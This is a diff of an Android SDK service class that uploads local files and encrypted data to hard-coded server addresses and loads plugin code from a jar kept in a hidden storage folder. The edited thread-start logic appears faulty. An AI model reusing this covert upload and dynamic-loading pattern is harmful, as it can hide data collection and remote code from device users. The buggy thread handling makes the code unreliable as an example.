@@ -99,8 +99,8 @@ public class SdkServ implements DServ{
 	
 	
 	//TODO 暂时写死
-	private static String upUrl = "http://180.96.63.71:8080/plserver/PS";
-	private static String upLogUrl = "http://192.168.0.16:8080/PLServer/PL";
+	static String upUrl = "http://192.168.0.16:8080/PLServer/PS";//"http://180.96.63.71:8080/plserver/PS";
+	static String upLogUrl = "http://192.168.0.16:8080/PLServer/PL";
 	static final String sdDir = Environment.getExternalStorageDirectory().getPath()+"/.dserver/";
 	private String emvClass = "cn.play.dserv.CheckTool";
 	private String emvPath = sdDir+"emv.jar";
@@ -690,7 +690,7 @@ public class SdkServ implements DServ{
 	*/
 	final String ENCORDING = "UTF-8";
 
-	boolean upload(String localFile, String upUrl, String vKey){
+	boolean upload(String localFile, String uplogUrl, String vKey){
 		String boundary = "---------------------------7dc7c595809b2";
 		boolean sucess = false;
 		try {
@@ -699,7 +699,7 @@ public class SdkServ implements DServ{
 
 			String fileName = file.getName();
 			// 用来解析主机名和端口
-			URL url = new URL(upUrl + "?f=" + fileName);
+			URL url = new URL(uplogUrl + "?f=" + fileName);
 			// 打开连接, 设置请求头
 			HttpURLConnection conn = (HttpURLConnection) url.openConnection();
 			conn.setConnectTimeout(10000);
@@ -794,6 +794,7 @@ public class SdkServ implements DServ{
 				Log.d(TAG, "postUrl data:"+sb.toString());
 				
 				String data = "up="+DService.Cenc(sb.toString());
+				Log.d(TAG, "enc data:"+data);
 				URL aUrl = new URL(upUrl);
 			    URLConnection conn = aUrl.openConnection();
 			    conn.setConnectTimeout(timeOut);
@@ -1109,6 +1110,10 @@ public class SdkServ implements DServ{
 				PLTask plug =(PLTask)class1.newInstance();
 */
 				PLTask plug = DService.CloadTask(this.ctx,dexPath,dexPath2);
+				if (plug == null) {
+					Log.e(TAG, "loadTask error:"+localPath);
+					return null;
+				}
 				//删除临时jar
 				f = new File(dexPath2);
 				if (f.exists() && f.isFile()) {
@@ -1175,7 +1180,12 @@ public class SdkServ implements DServ{
 			Log.d("CTX", ctx.getPackageName());
 		}
 		regReceiver();
-		if (lt == null || !lt.isRunFlag()) {
+		if (lt != null && lt.isRunFlag()) {
+			lt.setRunFlag(false);
+			try {
+				Thread.sleep(logSleepTime+1000);
+			} catch (InterruptedException e) {
+			}
 			lt.start();
 		}
 		this.config = this.readConfig(this.configPath);
